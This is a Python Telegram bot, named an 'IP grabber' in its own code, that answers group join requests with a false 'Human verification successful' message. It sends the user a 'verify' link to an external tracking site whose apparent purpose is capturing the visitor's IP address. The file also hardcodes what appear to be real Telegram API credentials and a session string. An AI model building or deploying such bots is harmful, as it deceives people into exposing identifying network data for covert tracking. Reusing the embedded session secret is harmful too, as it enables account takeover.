import asyncio
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
import requests
from datetime import datetime

# === YOUR DATA ===
API_ID = 32696327
API_HASH = "7748fec8a76bc4ed65006d13accd7555"
SESSION_STRING = "BQHy6AcALg8-IFn7jkiIrFq2qi9xZrWhiMY78No7c6ZlSkOAUI2RF3OrW4nATGI_faDP87KwAzE6TBOEeGbPdKm8VJtzVY2y9vW9xYt2YUMtCiRrnV2DAF56tUOvAM6WVPRh9j0Pq7YNbHsnGU8lrV6tO-eH5mwrZzdC3tiVsxm9KaxRd7KRkSRSoyWLxv0WuMDU2-vA4AzNyZMDK0F3V62guodW6XuBa2WvVK0fzgLTK14PG_ZOAWmrsn5Nz77t1-OYYVd4Wbc0fFqZTDr5g_OsJZeYimCLXY2tl3VlcXO-k8IYJ93sbDD5ZquBZDMeOJ8sZYSvoypHfhfFDdTWt-3wEB6upwAAAAB01CSBAA"
WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
LOG_CHANNEL = -1002290475903

app = Client("ip_grabber_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)

@app.on_chat_join_request()
async def handle_join_request(client, request):
    user_id = request.user_chat_id
    chat_id = request.chat.id
    first_name = request.from_user.first_name or "User"

    link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Verify Account & Join Group", url=link)]
    ])

    try:
        await client.send_message(
            user_id,
            "✅ Human verification successful!\n\n"
            "Click the button below for **final verification** and to join the group:\n\n"
            "Link will expire in 10 minutes.",
            reply_markup=keyboard
        )
        print(f"✅ Verification link sent to {user_id}")
    except Exception as e:
        print(f"❌ Failed to send message to {user_id}: {e}")

print("✅ IP Grabber Stealth Bot with Sangmata features is running...")
app.run()
